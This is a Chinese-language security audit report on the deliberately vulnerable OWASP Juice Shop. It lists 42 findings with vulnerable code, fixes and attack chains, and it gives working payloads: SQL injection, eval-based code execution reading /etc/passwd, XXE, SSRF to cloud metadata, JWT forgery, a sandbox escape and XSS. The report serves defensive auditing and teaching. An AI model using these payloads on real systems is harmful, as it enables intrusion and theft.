# OWASP Juice Shop v19.1.1 安全审计报告

> 审计日期: 2026-02-11
> 审计模式: 深度（五阶段全流程 + 4 并行 Agent + 攻击链构建）
> 技术栈: TypeScript + Node.js + Express 4.21 + Sequelize 6.37 + SQLite3 + Angular 20 + MongoDB

## 审计摘要

| 严重等级 | 数量 |
|---------|------|
| Critical | 8 |
| High | 18 |
| Medium | 12 |
| Low | 4 |
| **合计** | **42** |

---

## 🔴 Critical 漏洞 (8)

### VULN-001: SQL 注入 — 搜索产品 (Union-based)

- **文件**: `routes/search.ts:23`
- **CWE**: CWE-89

**问题代码:**
```typescript
// routes/search.ts:21-23
const criteria: any = req.query.q !== 'undefined' ? req.query.q : ''
criteria = criteria.length <= 200 ? criteria : criteria.substring(0, 200)
models.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`
)
```

**数据流**: `req.query.q` → `substring(0,200)` (仅截断，无转义) → `sequelize.query()` 字符串拼接

**Payload:**
```
GET /rest/products/search?q=')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--
```

**修复建议:** 使用 Sequelize 参数化查询：
```typescript
models.sequelize.query(
  `SELECT * FROM Products WHERE ((name LIKE :criteria OR description LIKE :criteria) AND deletedAt IS NULL) ORDER BY name`,
  { replacements: { criteria: `%${criteria}%` }, type: QueryTypes.SELECT }
)
```

---

### VULN-002: SQL 注入 — 登录认证绕过

- **文件**: `routes/login.ts:34`
- **CWE**: CWE-89

**问题代码:**
```typescript
// routes/login.ts:34
models.sequelize.query(
  `SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}' AND deletedAt IS NULL`,
  { model: UserModel, plain: true }
)
```

**数据流**: `req.body.email` → 无过滤 → `sequelize.query()` 字符串拼接

**Payload:**
```json
POST /rest/user/login
{ "email": "' OR 1=1--", "password": "anything" }
```

**修复建议:** 使用 ORM 查询方法：
```typescript
UserModel.findOne({ where: { email: req.body.email, password: security.hash(req.body.password), deletedAt: null } })
```

---

### VULN-003: 远程代码执行 (eval) — 用户资料页

- **文件**: `routes/userProfile.ts:55-62`
- **CWE**: CWE-94

**问题代码:**
```typescript
// routes/userProfile.ts:55-62
if (username?.match(/#{(.*)}/) !== null) {
  const code = username?.substring(2, username.length - 1)
  try {
    username = eval(code) // eslint-disable-line no-eval
  } catch (err) {
    username = '\\#{' + code + '}'
  }
}
```

**数据流**: `user.username` (DB, 用户可修改) → 正则匹配 `#{(...)}` → `eval(code)`

**Payload:**
```
先修改用户名: PUT /api/Users/:id { "username": "#{global.process.mainModule.require('child_process').execSync('cat /etc/passwd').toString()}" }
然后访问: GET /profile 触发 eval
```

**修复建议:** 删除 `eval()`，使用安全的模板引擎变量替换：
```typescript
// 移除 eval，改用白名单变量替换
const allowedVars: Record<string, string> = { username: user.username, email: user.email }
template = template.replace(/#{(\w+)}/g, (_, key) => allowedVars[key] ?? '')
```

---

### VULN-004: XXE 外部实体注入 — 文件上传

- **文件**: `routes/fileUpload.ts:79-87`
- **CWE**: CWE-611

**问题代码:**
```typescript
// routes/fileUpload.ts:79-87
const data = file.buffer.toString()
const sandbox = { libxml, data }
vm.createContext(sandbox)
const xmlDoc = vm.runInContext(
  'libxml.parseXml(data, { noblanks: true, noent: true, nocdata: true })',
  sandbox, { timeout: 2000 }
)
const xmlString = xmlDoc.toString(false)
// 错误信息中返回解析结果
challengeUtils.solveIf(challenges.xxeFileDisclosureChallenge, ...)
```

**数据流**: 上传 XML 文件 → `file.buffer.toString()` → `libxmljs2.parseXml(data, { noent: true })` — `noent: true` 启用外部实体解析

**Payload:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**修复建议:** 禁用外部实体解析：
```typescript
libxml.parseXml(data, { noblanks: true, noent: false, nocdata: true, nonet: true })
```

---

### VULN-005: SSRF — 头像 URL 上传

- **文件**: `routes/profileImageUrlUpload.ts:19-35`
- **CWE**: CWE-918

**问题代码:**
```typescript
// routes/profileImageUrlUpload.ts:19-35
const url = req.body.imageUrl
if (url.match(/(.)*solve\/challenges\/server-side(.)*/) !== null) {
  req.app.locals.abused_ssrf_bug = true
}
const response = await fetch(url)  // 无任何 URL 校验！
const imageBuffer = Buffer.from(await response.arrayBuffer())
```

**数据流**: `req.body.imageUrl` → 无协议/域名/IP 校验 → `fetch(url)`

**Payload:**
```json
POST /api/Users/:id/profileImage/url
{ "imageUrl": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
{ "imageUrl": "http://localhost:3000/api/Users" }
{ "imageUrl": "file:///etc/passwd" }
```

**修复建议:** 添加 URL 白名单 + 内网地址过滤：
```typescript
import { URL } from 'node:url'
const parsed = new URL(url)
if (!['http:', 'https:'].includes(parsed.protocol)) throw new Error('Invalid protocol')
if (/^(127\.|10\.|172\.(1[6-9]|2|3[01])\.|192\.168\.|169\.254\.|0\.)/.test(parsed.hostname) || parsed.hostname === 'localhost') {
  throw new Error('Internal addresses not allowed')
}
```

---

### VULN-006: JWT 私钥硬编码

- **文件**: `lib/insecurity.ts:23`
- **CWE**: CWE-798

**问题代码:**
```typescript
// lib/insecurity.ts:23-24
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\nMIICXAIBAAKBgQDNwqLEe9wg...(省略)...\r\n-----END RSA PRIVATE KEY-----'

// lib/insecurity.ts:56
export const authorize = (user = {}) => jwt.sign(user, privateKey, { expiresIn: '6h', algorithm: 'RS256' })
```

**Payload:**
```javascript
// 用泄露的私钥伪造 admin JWT
const jwt = require('jsonwebtoken')
const privateKey = '-----BEGIN RSA PRIVATE KEY-----\r\n...'
const token = jwt.sign({ data: { id: 1, email: 'admin@juice-sh.op', role: 'admin' } }, privateKey, { algorithm: 'RS256' })
// 使用: Authorization: Bearer <token>
```

**修复建议:** 从环境变量或密钥管理服务加载私钥：
```typescript
const privateKey = fs.readFileSync(process.env.JWT_PRIVATE_KEY_PATH || '/run/secrets/jwt_private_key', 'utf8')
```

---

### VULN-007: JWT 算法混淆 (none / HS256)

- **文件**: `routes/verify.ts:81-89`
- **CWE**: CWE-327

**问题代码:**
```typescript
// routes/verify.ts:81-89 — 项目使用旧版 express-jwt，未限制算法
export const jwtChallenges = () => (req: Request, res: Response, next: NextFunction) => {
  jwtChallenge(challenges.jwtUnsignedChallenge, req, 'none', /jwtn3d@/)
  jwtChallenge(challenges.jwtForgedChallenge, req, 'HS256', /rsa_lord@/)
  next()
}
```

**Payload:**
```
# none 算法: 将 JWT header 的 alg 改为 "none"，删除签名部分
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJkYXRhIjp7ImVtYWlsIjoiand0bjNkQGp1aWNlLXNoLm9wIn19.

# HS256 算法混淆: 用公钥 (jwt.pub) 作为 HMAC 密钥签名
const publicKey = fs.readFileSync('encryptionkeys/jwt.pub')
jwt.sign({ data: { email: 'rsa_lord@juice-sh.op' } }, publicKey, { algorithm: 'HS256' })
```

**修复建议:** 升级 express-jwt 并限制允许的算法：
```typescript
expressJwt({ secret: publicKey, algorithms: ['RS256'] })  // 仅允许 RS256
```

---

### VULN-008: Mass Assignment — 注册管理员

- **文件**: `server.ts:402-416`, `models/user.ts:80-84`
- **CWE**: CWE-915

**问题代码:**
```typescript
// server.ts:402 — POST /api/Users 无需认证
app.post('/api/Users', verify.registerAdminChallenge())  // 仅检测不拦截

// models/user.ts:80-84 — role 字段接受 admin
role: {
  type: DataTypes.STRING,
  defaultValue: 'customer',
  validate: { isIn: [['customer', 'deluxe', 'accounting', 'admin']] }
}
```

**Payload:**
```json
POST /api/Users
{ "email": "attacker@evil.com", "password": "123456", "passwordRepeat": "123456", "role": "admin", "securityQuestion": { "id": 1, "answer": "test" } }
```

**修复建议:** 在 finale-rest 中间件中过滤可写字段：
```typescript
app.post('/api/Users', (req, res, next) => {
  delete req.body.role       // 禁止客户端设置 role
  delete req.body.deluxeToken
  delete req.body.isActive
  next()
})
```

---

## 🟠 High 漏洞 (18)

### VULN-009: NoSQL $where 注入 (评论)

- **文件**: `routes/showProductReviews.ts:36` | **CWE**: CWE-943

```typescript
// 问题代码
db.reviewsCollection.find({ $where: 'this.product == ' + id })
```

**Payload:** `GET /rest/products/1/reviews` 改 id 为 `0; sleep(2000)`
**修复:** 使用标准查询 `db.reviewsCollection.find({ product: parseInt(id) })`

---

### VULN-010: NoSQL $where 注入 (订单追踪)

- **文件**: `routes/trackOrder.ts:18` | **CWE**: CWE-943

```typescript
db.ordersCollection.find({ $where: `this.orderId === '${id}'` })
```

**Payload:** `GET /rest/track-order/' || true || '`
**修复:** `db.ordersCollection.find({ orderId: id })`

---

### VULN-011: NoSQL 操作符注入 (评论更新)

- **文件**: `routes/updateProductReviews.ts:17-20` | **CWE**: CWE-943

```typescript
db.reviewsCollection.update({ _id: req.body.id }, { $set: { message: req.body.message } }, { multi: true })
```

**Payload:** `PATCH /rest/products/reviews { "id": { "$ne": -1 }, "message": "pwned" }` — 篡改所有评论
**修复:** 校验 `_id` 类型 + 移除 `multi: true` + 校验 author 所有权：
```typescript
if (typeof req.body.id !== 'string') return res.status(400).send()
db.reviewsCollection.update({ _id: req.body.id, author: user.data.email }, { $set: { message: req.body.message } })
```

---

### VULN-012: 沙箱逃逸 (notevil + vm)

- **文件**: `routes/b2bOrder.ts:19-23` | **CWE**: CWE-94

```typescript
const sandbox = { safeEval, orderLinesData: req.body.orderLinesData }
vm.createContext(sandbox)
vm.runInContext('safeEval(orderLinesData)', sandbox, { timeout: 2000 })
```

**Payload:** `POST /b2b/v2/orders { "orderLinesData": "(function(){var process=this.constructor.constructor('return this.process')();return process.mainModule.require('child_process').execSync('id').toString()})()" }`
**修复:** 使用 `JSON.parse()` 替代 `safeEval`，仅接受 JSON 数组格式

---

### VULN-013: 本地文件读取 (dataErasure layout)

- **文件**: `routes/dataErasure.ts:68-74` | **CWE**: CWE-22

```typescript
if (req.body.layout) {
  const filePath = path.resolve(req.body.layout).toLowerCase()
  const isForbiddenFile = (filePath.includes('ftp') || filePath.includes('ctf.key') || filePath.includes('encryptionkeys'))
  if (!isForbiddenFile) { res.render('dataErasureResult', { ...req.body }) }
}
```

**Payload:** `POST /dataerasure { "layout": "../package.json" }`
**修复:** 移除 `layout` 参数支持，硬编码视图名：`res.render('dataErasureResult', { email, securityAnswer })`

---

### VULN-014: Null Byte 文件读取绕过

- **文件**: `routes/fileServer.ts:27-33` | **CWE**: CWE-158

```typescript
if (file && endsWithAllowlistedFileType(file)) {
  file = security.cutOffPoisonNullByte(file)  // 先检查后缀，再截断 null byte
  res.sendFile(path.resolve('ftp/', file))
}
```

**Payload:** `GET /ftp/package.json.bak%00.md`
**修复:** 先截断 null byte，再检查后缀：
```typescript
file = security.cutOffPoisonNullByte(file)
if (endsWithAllowlistedFileType(file)) { res.sendFile(...) }
```

---

### VULN-015: Zip Slip 任意文件写入

- **文件**: `routes/fileUpload.ts:41-45` | **CWE**: CWE-22

```typescript
const absolutePath = path.resolve('uploads/complaints/' + fileName)
if (absolutePath.includes(path.resolve('.'))) {  // 检查不充分
  entry.pipe(fs.createWriteStream('uploads/complaints/' + fileName))
}
```

**Payload:** 上传 ZIP，内含文件名 `../../ftp/legal.md` 的条目
**修复:** 使用 `path.normalize` 后检查是否在目标目录内：
```typescript
const safePath = path.join('uploads/complaints/', path.basename(fileName))
```

---

### VULN-016: 加密密钥目录无限制读取

- **文件**: `routes/keyServer.ts:14` | **CWE**: CWE-552

```typescript
res.sendFile(path.resolve('encryptionkeys/', file))  // 仅检查不含 '/'
```

**Payload:** `GET /encryptionkeys/jwt.pub`
**修复:** 添加认证中间件 + 文件白名单，或移除该端点

---

### VULN-017: MD5 密码哈希（无盐值）

- **文件**: `lib/insecurity.ts:43` | **CWE**: CWE-328

```typescript
export const hash = (data: string) => crypto.createHash('md5').update(data).digest('hex')
```

**Payload:** 获取数据库后用彩虹表查询，如 `0192023a7bbd73250516f069df18b500` → `admin123`
**修复:** 使用 bcrypt：`import bcrypt from 'bcryptjs'; export const hash = (data: string) => bcrypt.hashSync(data, 12)`

---

### VULN-018: Basket IDOR

- **文件**: `routes/basket.ts:17-18` | **CWE**: CWE-639

```typescript
const id = req.params.id
BasketModel.findOne({ where: { id } })  // 不校验 basket 是否属于当前用户
```

**Payload:** `GET /rest/basket/2` (当前用户 basket id 为 1)
**修复:** 添加所有权校验：`BasketModel.findOne({ where: { id, UserId: user.data.id } })`

---

### VULN-019: Order Checkout IDOR

- **文件**: `routes/order.ts:35-36` | **CWE**: CWE-639

```typescript
BasketModel.findOne({ where: { id: req.params.id } })  // 不校验所有权
```

**Payload:** `POST /rest/basket/2/checkout` (结算他人购物车)
**修复:** 同 VULN-018，添加 `UserId` 条件

---

### VULN-020: 密码修改跳过当前密码验证

- **文件**: `routes/changePassword.ts:39-42` | **CWE**: CWE-620

```typescript
if (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password) {
  res.status(401).send(...)  // 仅当 currentPassword 非空时校验
  return
}
// 不提供 current 参数 → 跳过校验，直接修改密码
```

**Payload:** `GET /rest/user/change-password?new=hacked&repeat=hacked` (不传 current)
**修复:** 将 `if (currentPassword &&` 改为 `if (!currentPassword ||`，强制要求当前密码；改用 POST 方法

---

### VULN-021: Feedback UserId 伪造

- **文件**: `server.ts:396` | **CWE**: CWE-639

```typescript
app.post('/api/Feedbacks', verify.forgedFeedbackChallenge())  // 仅检测不拦截
```

**Payload:** `POST /api/Feedbacks { "UserId": 1, "comment": "fake", "rating": 5, "captchaId": 1, "captcha": "13" }`
**修复:** 从 JWT 中提取 UserId，忽略请求体中的值

---

### VULN-022: Products PUT 缺少认证

- **文件**: `server.ts:364` | **CWE**: CWE-862

```typescript
// app.put('/api/Products/:id', security.isAuthorized())  // 被注释掉了！
```

**Payload:** `PUT /api/Products/1 { "price": 0.01, "description": "<script>alert(1)</script>" }`
**修复:** 取消注释并添加 admin 角色检查：`app.put('/api/Products/:id', security.isAuthorized(), security.isAdmin())`

---

### VULN-023: DOM XSS (搜索框)

- **文件**: `frontend/.../search-result.component.ts:171` | **CWE**: CWE-79

```typescript
this.searchValue = this.sanitizer.bypassSecurityTrustHtml(queryParam)  // 绕过 Angular XSS 防护
```

**Payload:** `/#/search?q=<iframe src="javascript:alert(document.cookie)">`
**修复:** 移除 `bypassSecurityTrustHtml`，使用纯文本绑定 `{{ searchValue }}`

---

### VULN-024: 存储型 XSS (Feedback)

- **文件**: `models/feedback.ts:44-45` | **CWE**: CWE-79

```typescript
sanitizedComment = security.sanitizeHtml(comment)  // 非递归，单次调用
```

**Payload:** `POST /api/Feedbacks { "comment": "<<script>Foo</script>iframe src=\"javascript:alert('xss')\">", ... }`
**修复:** 使用递归清理 `sanitizeSecure` 替代 `sanitizeHtml`

---

### VULN-025: HTTP Header XSS (True-Client-IP)

- **文件**: `routes/saveLoginIp.ts:18-26` | **CWE**: CWE-79

```typescript
let lastLoginIp = req.headers['true-client-ip']
if (utils.isChallengeEnabled(challenges.httpHeaderXssChallenge)) {
  // 不做 sanitize！
} else { lastLoginIp = security.sanitizeSecure(lastLoginIp ?? '') }
```

**Payload:** 登录时添加请求头 `True-Client-IP: <iframe src="javascript:alert('xss')">`
**修复:** 无条件调用 `sanitizeSecure`

---

### VULN-026: CORS 完全开放

- **文件**: `server.ts:180-182` | **CWE**: CWE-942

```typescript
app.options('*', cors())
app.use(cors())
```

**Payload:** 恶意网站通过 `fetch('https://juice-shop/api/Users', { credentials: 'include' })` 窃取数据
**修复:** 配置 CORS 白名单：`app.use(cors({ origin: ['https://your-domain.com'], credentials: true }))`

---

## 🟡 Medium 漏洞 (12)

### VULN-027: YAML 反序列化炸弹

- **文件**: `routes/fileUpload.ts:116` | **CWE**: CWE-502

```typescript
const yamlString = vm.runInContext('JSON.stringify(yaml.load(data))', sandbox, { timeout: 2000 })
```

**Payload:** 上传包含指数级锚点引用的 YAML 文件（Billion Laughs 变体）
**修复:** 使用 `yaml.load(data, { schema: yaml.FAILSAFE_SCHEMA })` + 限制文件大小

---

### VULN-028: 开放重定向 (includes 绕过)

- **文件**: `routes/redirect.ts:15-19`, `lib/insecurity.ts:135-141` | **CWE**: CWE-601

```typescript
export const isRedirectAllowed = (url: string) => {
  for (const allowedUrl of redirectAllowlist) {
    allowed = allowed || url.includes(allowedUrl)  // includes 而非 startsWith
  }
}
```

**Payload:** `GET /redirect?to=https://evil.com?https://github.com/juice-shop/juice-shop`
**修复:** 使用 `new URL(url).origin` 严格匹配白名单域名

---

### VULN-029: Basket Item JSON 重复键绕过

- **文件**: `routes/basketItems.ts:37-43` | **CWE**: CWE-20

```typescript
// 校验用 basketIds[0]，实际用 basketIds[basketIds.length - 1]
if (Number(user.bid) != Number(basketIds[0])) { /* 拒绝 */ }
else { BasketId: basketIds[basketIds.length - 1] }
```

**Payload:** `POST /api/BasketItems {"ProductId":1,"BasketId":1,"BasketId":2,"quantity":1}`
**修复:** 使用标准 `JSON.parse`，取唯一值

---

### VULN-030: 优惠券算法可逆 (Z85)

- **文件**: `lib/insecurity.ts:99-121` | **CWE**: CWE-330

```typescript
export const generateCoupon = (discount: number, date = new Date()) => {
  const coupon = utils.toMMMYY(date) + '-' + discount  // 格式: FEB26-90
  return z85.encode(coupon)
}
```

**Payload:** Z85 编码 `FEB26-99` → 提交为优惠券获得 99% 折扣
**修复:** 使用 HMAC 签名的优惠券：`coupon + '.' + hmac(coupon, secret)`

---

### VULN-031: 过期优惠券 `==` 绕过

- **文件**: `routes/order.ts:190` | **CWE**: CWE-697

```typescript
if (campaign && couponDate == campaign.validOn) { // == 而非 ===
```

**Payload:** Base64 编码 `WMNSDY2019-1552003200000` 提交获得 75% 折扣
**修复:** 使用 `===` 严格比较 + 检查优惠券是否过期

---

### VULN-032: Deluxe 会员免费升级

- **文件**: `routes/deluxe.ts:24-40` | **CWE**: CWE-841

```typescript
if (req.body.paymentMode === 'wallet') { /* 扣钱包 */ }
if (req.body.paymentMode === 'card') { /* 验证信用卡 */ }
// paymentMode 为其他值时，跳过所有支付，直接升级！
const updatedUser = await user.update({ role: security.roles.deluxe })
```

**Payload:** `POST /rest/deluxe-membership { "paymentMode": "free" }`
**修复:** 添加 `else { return res.status(400).json({ error: 'Invalid payment mode' }) }`

---

### VULN-033: 钱包充值无金额校验

- **文件**: `routes/wallet.ts:26` | **CWE**: CWE-20

```typescript
WalletModel.increment({ balance: req.body.balance }, { where: { UserId: req.body.UserId } })
```

**Payload:** `PUT /rest/wallet/balance { "balance": 999999, "paymentId": "valid_card_id" }`
**修复:** 添加金额校验：`if (req.body.balance <= 0 || req.body.balance > 1000) return res.status(400).send()`

---

### VULN-034: 负数订单总价 → 钱包增值

- **文件**: `routes/order.ts:136-142` | **CWE**: CWE-20

```typescript
// totalPrice 可为负数时
WalletModel.decrement({ balance: totalPrice }, ...)  // decrement 负数 = increment
```

**Payload:** 使用 99% 优惠券 (VULN-030) 使 totalPrice < 0，用钱包支付
**修复:** `if (totalPrice <= 0) return next(new Error('Invalid order total'))`

---

### VULN-035: CAPTCHA 答案泄露 + 可重放

- **文件**: `routes/captcha.ts:25-46` | **CWE**: CWE-804

```typescript
res.json({ captchaId, captcha: expression, answer })  // answer 直接返回！
// 验证后不删除，可无限重放
```

**Payload:** `GET /rest/captcha` → 读取 answer 字段 → 反复使用同一 captchaId + answer
**修复:** 从响应中移除 `answer` 字段；验证成功后删除 CAPTCHA 记录

---

### VULN-036: Image CAPTCHA 绕过

- **文件**: `routes/imageCaptcha.ts:50` | **CWE**: CWE-804

```typescript
if (!captchas[0] || req.body.answer === captchas[0].answer) { next() }
// 没有 CAPTCHA 记录时直接放行
```

**Payload:** 不请求 CAPTCHA，直接调用 `POST /rest/user/data-export`
**修复:** `if (!captchas[0]) return res.status(400).json({ error: 'CAPTCHA required' })`

---

### VULN-037: 速率限制 X-Forwarded-For 绕过

- **文件**: `server.ts:337-342` | **CWE**: CWE-799

```typescript
app.enable('trust proxy')
rateLimit({ keyGenerator: ({ headers, ip }) => headers['X-Forwarded-For'] ?? ip })
```

**Payload:** 每次请求使用不同的 `X-Forwarded-For` 值
**修复:** 使用 `req.ip`（Express 在 trust proxy 下自动解析）而非手动读取 header

---

### VULN-038: 前端路由信息泄露

- **文件**: `frontend/.../app.routing.ts` | **CWE**: CWE-200

隐藏路由 `/administration`、`/accounting` 在前端 JS 中明文暴露，`AdminGuard` 仅前端校验。

**Payload:** 直接访问 `/#/administration` 或调用后端 API
**修复:** 后端 API 添加 role 校验中间件，不依赖前端 Guard

---

## 🟢 Low 漏洞 (4)

### VULN-039: errorhandler 生产环境暴露堆栈

- **文件**: `server.ts:671` | `app.use(errorhandler())` 无条件启用
- **修复:** `if (process.env.NODE_ENV === 'development') app.use(errorhandler())`

### VULN-040: Swagger API 文档无认证暴露

- **文件**: `server.ts:286` | `/api-docs` 公开访问
- **修复:** 添加认证中间件或仅在开发环境启用

### VULN-041: Prometheus Metrics 无认证暴露

- **文件**: `server.ts:713` | `/metrics` 公开访问
- **修复:** `app.get('/metrics', security.isAuthorized(), security.isAdmin(), metrics.serveMetrics())`

### VULN-042: helmet.xssFilter() 被注释

- **文件**: `server.ts:187` | `// app.use(helmet.xssFilter())`
- **修复:** 取消注释，启用 X-XSS-Protection 头

---

## 🔗 攻击链分析

### CHAIN-001: SQL 注入 → 管理员接管 → RCE

```
VULN-002 (SQL注入登录: ' OR 1=1--)
  → 以管理员身份登录
  → VULN-003 (修改用户名为 #{require('child_process').execSync('id')})
  → 访问 /profile 触发 eval()
  → 远程代码执行 (RCE)
```

综合等级: **Critical** — 从未认证到完全控制服务器

### CHAIN-002: 优惠券伪造 → 负数订单 → 无限钱包

```
VULN-030 (Z85 逆向生成 FEB26-99 优惠券)
  → 应用到购物车获得 99% 折扣
  → VULN-034 (totalPrice < 0)
  → 钱包支付: decrement(负数) = increment
  → 余额无限增长
```

综合等级: **High** — 完全破坏支付系统

### CHAIN-003: JWT 伪造 → 管理员权限 → 全站控制

```
VULN-006 (硬编码私钥) 或 VULN-007 (算法混淆)
  → 伪造 admin JWT
  → 访问 /administration
  → VULN-022 (PUT /api/Products/:id 修改产品价格为 0)
  → VULN-024 (注入存储型 XSS 到产品描述)
  → 影响所有用户
```

综合等级: **Critical** — 从源码泄露到全站 XSS

### CHAIN-004: 信息泄露 → 密码破解 → 账户接管

```
VULN-001 (Union SQL 注入泄露 Users 表: email + MD5 hash)
  → VULN-017 (MD5 无盐，彩虹表秒破)
  → 登录任意用户
  → VULN-018/019 (IDOR 访问其他用户购物车/订单)
```

综合等级: **Critical** — 全量用户数据泄露 + 账户接管

### CHAIN-005: XXE → 密钥窃取 → JWT 伪造

```
VULN-004 (XXE 读取 file:///app/encryptionkeys/jwt.pub)
  或 VULN-016 (GET /encryptionkeys/jwt.pub 直接访问)
  → VULN-007 (HS256 算法混淆，用公钥签名)
  → 伪造任意用户 JWT
```

综合等级: **Critical**

### CHAIN-006: Zip Slip → 字幕覆盖 → XSS

```
VULN-015 (Zip Slip 写入 ../../frontend/dist/.../owasp_promo.vtt)
  → 注入 </script><script>alert('xss')</script>
  → 所有访问视频页面的用户触发 XSS
```

综合等级: **High**

---

## 核心问题模式

1. **SQL/NoSQL 全部字符串拼接** — 无参数化查询
2. **认证 ≠ 授权** — `isAuthorized()` 只验证登录，不验证资源所有权
3. **密码学全面薄弱** — MD5 无盐、硬编码密钥、可逆优惠券算法
4. **前端主动绕过安全机制** — 大量使用 `bypassSecurityTrustHtml`
5. **业务逻辑无数值校验** — 支付流程缺少事务保护和金额校验

## 修复优先级

1. **P0 (立即)**: VULN-001~008 — Critical 漏洞
2. **P1 (本周)**: VULN-009~026 — High 漏洞
3. **P2 (本月)**: VULN-027~038 — Medium 漏洞
4. **P3 (下迭代)**: VULN-039~042 — Low 漏洞
